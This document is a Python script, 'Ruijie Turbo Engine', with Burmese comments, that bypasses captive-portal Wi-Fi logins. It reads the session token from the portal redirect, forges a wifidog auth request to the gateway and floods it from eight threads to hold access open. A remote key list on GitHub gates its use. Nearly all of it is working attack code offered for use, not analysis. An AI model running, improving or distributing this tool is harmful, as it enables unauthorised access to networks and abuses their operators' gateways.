import requests, re, urllib3, time, threading, random, os, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# 🌐 GITHUB REMOTE CONFIG
# ===============================
GITHUB_USER = "tmmt6132-coder"
REPO_NAME = "Bypass"
URL_TO_KEYS = f"https://raw.githubusercontent.com/{GITHUB_USER}/{REPO_NAME}/main/keys.txt"

def get_system_id():
    try:
        import hashlib
        combined = str(os.getuid()) + os.environ.get('USER', 'unknown')
        return hashlib.md5(combined.encode()).hexdigest()[:10].upper()
    except:
        return "GET-ID-ERR"

def check_remote_approval():
    os.system('clear' if os.name == 'posix' else 'cls')
    sys_id = get_system_id()
    print(f"\033[95m╔════════════════════════════════════════╗\n║       TURBO ENGINE ACCESS CONTROL      ║\n╚════════════════════════════════════════╝\033[0m")
    print(f"\n[📡] Your System ID: \033[92m{sys_id}\033[0m")
    
    try:
        t_buster = f"?t={int(time.time())}"
        response = requests.get(URL_TO_KEYS + t_buster, timeout=10)
        if response.status_code != 200: return False
        
        lines = response.text.strip().splitlines()
        for line in lines:
            line = line.strip()
            if "," not in line or line.startswith("#"): continue
            parts = line.split(',')
            allowed_id, exp_str = parts[0].strip(), parts[1].strip()
            if sys_id == allowed_id:
                if datetime.now() < datetime.strptime(exp_str, '%Y-%m-%d'):
                    print(f"\033[92m[✓] ACCESS GRANTED! (Expires: {exp_str})\033[0m")
                    time.sleep(1)
                    return True
        return False
    except: return False

# ===============================
# 🚀 CORE ENGINE LOGIC
# ===============================

def turbo_pulse(auth_link):
    """Keep connection alive with fast requests"""
    while True:
        try:
            requests.get(auth_link, timeout=5, verify=False)
        except: pass
        time.sleep(0.1)

def start_bypass():
    os.system('clear')
    print(f"\033[96m" + "="*45 + "\n   🚀 RUIJIE TURBO ENGINE v2.5 ACTIVE\n" + "="*45 + "\033[0m")
    
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    
    while True:
        try:
            # အင်တာနက် အခြေအနေ စစ်ဆေးခြင်း
            try:
                r = requests.get(test_url, allow_redirects=True, timeout=5)
                status_code = r.status_code
                final_url = r.url
            except:
                status_code = 0
                final_url = test_url

            # Portal တွေ့ရှိပါက (Redirect ဖြစ်သွားပါက)
            if status_code != 204 and final_url != test_url:
                print(f"\n\033[93m[!] Captive Portal Detected: {final_url[:40]}...\033[0m")
                
                parsed = urlparse(final_url)
                params = parse_qs(parsed.query)
                
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                sid = params.get('sessionId', [None])[0]
                
                if not sid:
                    sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', final_url)
                    sid = sid_match.group(1) if sid_match else "AUTO_TOKEN_EXTRACTED"
                
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
                
                print(f"\033[92m[✓] Session Captured: {sid[:15]}...\033[0m")
                print(f"\033[35m[*] Turbo Engine Launching Multi-Threads...\033[0m")
                
                for _ in range(8):
                    threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
                
                print(f"\033[92m[✓] Bypass Active! Monitoring connection...\033[0m\n")
                
                # အင်တာနက် အမှန်တကယ် ပွင့်သွားပြီလား စစ်ဆေးခြင်း
                while True:
                    try:
                        check = requests.get("http://www.google.com", timeout=5)
                        if check.status_code == 200:
                            print(f"\r\033[0;32m[✓]\033[0m Internet Online | Engine Stable     ", end="")
                        else:
                            break
                    except: break
                    time.sleep(10)
            
            else:
                print(f"\r\033[90m[*] Status: Monitoring Network... (No Portal Found)\033[0m", end="")
            
            time.sleep(3)

        except KeyboardInterrupt:
            print(f"\n\033[91m[!] Engine Stopped by User.\033[0m")
            break
        except Exception as e:
            # Error တက်ရင်လည်း ပိတ်မသွားအောင် ထိန်းထားခြင်း
            time.sleep(5)

if __name__ == "__main__":
    if check_remote_approval():
        start_bypass()
    else:
        print(f"\n\033[91m[!] Not Authorized. Contact Admin.\033[0m")
        sys.exit()
                    
